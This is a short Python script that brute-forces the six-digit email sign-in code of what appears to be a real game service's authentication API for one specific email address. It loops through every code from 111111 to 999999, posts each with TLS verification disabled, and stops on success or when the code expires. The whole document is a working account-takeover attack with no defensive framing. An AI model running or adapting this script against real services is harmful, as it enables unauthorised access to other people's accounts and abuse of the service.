import requests

url = 'https://api.dashcraft.io/auth/signIn'
myobj = {'email': 'ovsecrets10@gmail.com', 'code':'420694'}

for i in range(111111, 999999):
    x = requests.post(url, json={'email': 'ovsecrets10@gmail.com', 'code':str(i)}, verify=False)
    if x.status_code == 200:
        print(i)
        break
    if x.text == "code_expired":
        print("Expired at: " + str(i))
        break

